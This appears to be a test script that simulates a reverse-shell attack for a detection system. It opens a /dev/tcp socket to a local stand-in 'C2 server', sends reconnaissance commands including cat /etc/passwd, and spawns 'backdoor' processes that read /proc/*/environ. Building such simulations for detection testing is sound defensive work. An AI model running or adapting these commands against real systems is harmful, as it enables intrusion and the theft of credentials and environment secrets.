#!/bin/sh
# Attack 06: Reverse shell
# Signature: anomalous process tree (shell spawned from network context),
#   dup2 to redirect fds 0/1/2 to a socket, then exec/read/write on socket
# Simulates: attacker establishing an interactive shell over a TCP connection
END=$(($(date +%s) + ${1:-20}))
# bash supports /dev/tcp — use it to open a socket and run commands through it.
# We connect to napcat's own web port (always up) as the "C2 server".
while [ "$(date +%s)" -lt "$END" ]; do
  bash -c '
    exec 3<>/dev/tcp/127.0.0.1/3000  2>/dev/null || exit 0
    # Classic reverse shell pattern: redirect stdio to the socket, exec shell
    echo "id; whoami; uname -a; ls -la /; cat /etc/passwd" >&3
    timeout 2 cat <&3 >/dev/null 2>&1
    exec 3>&-
  ' 2>/dev/null
  # Also spawn subprocesses that look like a shell session
  sh -c 'echo backdoor; ps aux; netstat -tlnp 2>/dev/null; cat /proc/*/environ 2>/dev/null | head' >/dev/null 2>&1
done
